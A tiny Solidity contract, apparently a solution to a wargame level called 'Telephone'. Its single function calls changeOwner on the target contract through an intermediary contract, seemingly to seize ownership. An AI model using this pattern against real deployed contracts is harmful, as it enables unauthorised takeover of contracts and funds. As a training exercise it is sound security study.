// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Telephone.sol";

contract TelephoneAttract{
    function att(address addr) public {
        Telephone(addr).changeOwner(address(this));
    }
}